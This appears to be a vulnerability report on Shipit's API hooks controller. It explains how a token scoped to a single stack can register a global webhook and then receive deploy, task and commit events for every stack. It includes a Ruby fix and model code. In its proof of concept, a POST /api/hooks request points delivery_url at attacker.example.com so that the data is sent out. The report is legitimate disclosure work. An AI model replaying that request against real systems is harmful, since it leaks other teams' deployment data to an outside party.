### Title
Stack-scoped `ApiClient` can register a global `Hook` and receive events for every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`ApiClient` tokens can be scoped to a single stack via `stack_id`, and this binding is meant to restrict every API action the token can perform to that one stack. `Shipit::Api::BaseController#stacks`/`#stack` enforce that binding by intersecting the requested stack with `current_api_client.stack_id`. `Shipit::Api::HooksController`, however, is reachable through a stack-less route (`/api/hooks`) and only enforces the generic `write:hook`/`read:hook` permission, never calling into the `stack`/`stacks` scoping helpers when `params[:stack_id]` is absent. This lets a token scoped to stack A create a **global** `Hook` (`stack_id: nil`), which subsequently receives `deploy`, `task`, `rollback`, `commit_status`, `lock`, `merge`, `pull_request`, etc. events for **every** stack in the installation, not just the one the token was authorized for.

### Finding Description
`ApiClient` supports a `stack_id` scope column: when set, the client should only be able to touch that stack. [1](#0-0) 

This scoping is enforced centrally in `BaseController#stacks`/`#stack`, which restrict the queryable `Stack` set to `current_api_client.stack_id` when the client is scoped: [2](#0-1) 

`Api::HooksController`, however, computes its own scope directly from `Hook.where(stack_id:)`, bypassing the `stacks`/`stack` binding whenever `params[:stack_id]` is not present, which happens on the stack-less route: [3](#0-2) 

Routing exposes both a stack-scoped hooks resource (`/api/stacks/*stack_id/hooks`) and a completely global one with no stack context (`/api/hooks`): [4](#0-3) 

Only the generic, stack-agnostic permission is checked for this controller: [5](#0-4) 

A `Hook` with `stack_id: nil` is a "global" hook and is delivered every event for every stack, per `Hook.for_stack`/`Hook.global`: [6](#0-5) 

The result: the equality that should hold — "the stack a token authorizes" == "the stack(s) whose events the token's created hook can touch" — is broken. `POST /api/hooks` (no `stack_id` in the URL) with a token whose `permissions` include `write:hook` and whose `stack_id` is set to stack A succeeds in creating a hook with `stack_id: nil`, which will subsequently receive events (deploy status, task lifecycle, commit_status, lock/unlock, merge/pull_request activity) for every other stack B, C, ... that this token was never authorized to see.

### Impact Explanation
This is a permission-scope escalation: a credential explicitly restricted to one stack (a common pattern used to hand out limited automation tokens, e.g. via `CCMenuUrlController`'s pattern of scoped `ApiClient.create_with(permissions: ...)`) can be used to silently exfiltrate events/state (deploy results, task outputs metadata, lock reasons, commit statuses, merge activity) for stacks it has no visibility into, by pointing the created hook's `delivery_url` at an attacker-controlled endpoint. This matches the "escalation into… unauthenticated/unauthorized read of stack state, task streams or deploy output" High-impact bucket, since it converts a single-stack-scoped credential into a cross-stack data exfiltration primitive.

### Likelihood Explanation
Any holder of a legitimately-issued, single-stack-scoped `ApiClient` token with the `write:hook` permission bit can exploit this with one unauthenticated (from the target stacks' perspective) API call — no additional privileges, no race conditions, no social engineering. `write:hook` is a plausible permission to grant to a scoped automation client (e.g., to let a team register its own webhook), making this a realistic misconfiguration/misuse path rather than a purely theoretical one.

### Recommendation
In `Shipit::Api::HooksController`, always route hook scoping through the same `stack`/`stacks` binding used elsewhere, and reject/omit the stack-less endpoint (or force `stack_id` to the client's authorized stack) when `current_api_client.stack_id?` is true. Concretely, `stack_id` should be derived as:
```ruby
def stack_id
  if current_api_client.stack_id?
    current_api_client.stack_id # never allow a scoped client to touch stack_id: nil
  elsif params[:stack_id].present?
    stack.id
  end
end
```
so that a stack-scoped token can never create, read, update or destroy a global (`stack_id: nil`) hook, mirroring the `owner` check added to `_withdraw()` in the referenced report — i.e., check the binding that is actually acted upon (the hook's resulting `stack_id`), not just the generic permission bit.

### Proof of Concept
1. Create an `ApiClient` scoped to Stack A only, with permission `write:hook`:
   `ApiClient.create!(creator: user, name: "scoped", stack_id: stack_a.id, permissions: %w[write:hook read:hook])`
   (mirrors the scoped-client pattern already used in `CCMenuUrlController#client`) — [7](#0-6) 
2. Authenticate as that client and call the stack-less route:
   `POST /api/hooks` with body `{ "delivery_url": "https://attacker.example.com/collect", "events": ["deploy","task","commit_status"] }`.
3. `HooksController#create` succeeds (`require_permission :write, :hook` passes, and `stack_id` resolves to `nil` because `params[:stack_id]` is absent) — [8](#0-7) 
4. The created `Hook` has `stack_id: nil`, so `Hook.for_stack(stack_b.id)` includes it — [9](#0-8)  and `Hook.deliver(:deploy, stack_b.id, payload)` will POST stack B's deploy payload to the attacker's URL, even though the token was only ever authorized for stack A.

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
